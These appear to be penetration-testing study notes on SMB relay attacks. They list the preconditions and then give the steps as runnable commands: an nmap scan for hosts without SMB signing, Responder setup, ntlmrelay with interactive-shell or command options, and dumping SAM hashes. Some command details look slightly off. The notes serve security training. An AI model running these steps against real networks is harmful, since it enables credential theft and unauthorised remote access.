# V. SMB Relay Attack Overview

## What is a SMB Relay Attack?

In an SMB relay attack, an attacker intercepts SMB traffic between a client and a server and then relays that traffic to another target system. The attacker typically acts as a man-in-the-middle, capturing authentication credentials or other sensitive information passed between the client and the server.

## Requirements:

- SMB Signing must be disabled or not enforced on the target.
- Relayed user credentials must be admin on machine for any real value.

## How to perform a SMB Relay Attack:

- Identify hosts without SMB Signing
    - Can be done with nmap using the following command : `nmap --script=smb2-security-mode.nse -p <IP ADDRESS>`
- Edit the `Responder.conf` file located at `/etc/responder/Responder.conf` with a text editor, and make the following changes:
    - Set `SMB = Off` and `HTTP = Off`
- Run Responder using `sudo responder -I tun0 -dwP`
- Setup the relay using ntlmrelay using `sudo ntlmrelay.py -tf targets.txt -smb2support` (can add `-i` at the end for an interactive shell, or use `-c` to run a command)
- Make an event occur on the target machine.
- Get SAM hashes